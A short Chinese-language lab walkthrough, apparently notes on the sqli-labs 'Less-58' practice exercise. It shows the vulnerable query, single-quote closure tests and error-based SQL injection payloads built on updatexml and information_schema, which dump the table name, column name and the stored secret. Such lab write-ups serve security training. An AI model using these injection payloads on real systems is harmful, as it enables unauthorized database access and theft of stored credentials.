---
title: less58
url: https://www.yuque.com/u29002979/ep2zrx/bp76dawm6tiyma2z
---

```bash
$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
```

通过猜解发现闭合方式为单引号'
&#x20;尝试后发现没有了回显，采用报错注入的方式进行爆破

`?id=1' and 1=1--+`
`?id=1' and 1=2--+` <a name="xUWO0"></a>

# 报错注入

```bash
爆破数据表
?id=-1' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
数据表：ya8oopss6p

爆破字段名
?id=-1' and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='ya8oopss6p'),0x7e),1) -- +
字段：secret_VCIW

获取密码
?id=-1' and updatexml(1,concat(0x7e,(select secret_VCIW from ya8oopss6p),0x7e),1) -- +
密码：hS3pemAQq50IlYe5RRctDcPH
```
